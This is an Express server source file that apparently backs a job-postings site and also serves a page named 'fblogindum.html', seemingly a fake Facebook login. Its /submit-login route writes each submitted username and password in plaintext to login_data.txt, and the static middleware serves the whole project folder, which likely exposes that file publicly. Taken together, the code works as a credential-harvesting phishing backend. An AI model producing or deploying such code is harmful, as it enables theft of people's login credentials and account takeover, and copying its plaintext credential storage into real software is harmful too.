const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000; // Use Render's PORT environment variable

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Serve static files from the "public" directory

// Route to handle login form submission
app.post('/submit-login', (req, res) => {
    const { username, password } = req.body;
    const data = `Username: ${username}, Password: ${password}\n`; // Format the data to save

    // Append data to a text file
    fs.appendFile(path.join(__dirname, 'login_data.txt'), data, (err) => {
        if (err) {
            console.error('Error writing to file', err);
            return res.status(500).send('Error saving data.');
        }
        res.send('Login information saved successfully.');
    });
});

// Route to serve the homepage
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'Home.html')); 
});
app.get('/Job Postings.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Job Postings.html')); 
});
app.get('/Announcements.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Announcements.html')); 
});
app.get('/public/fblogindum.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'fblogindum.html'));
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
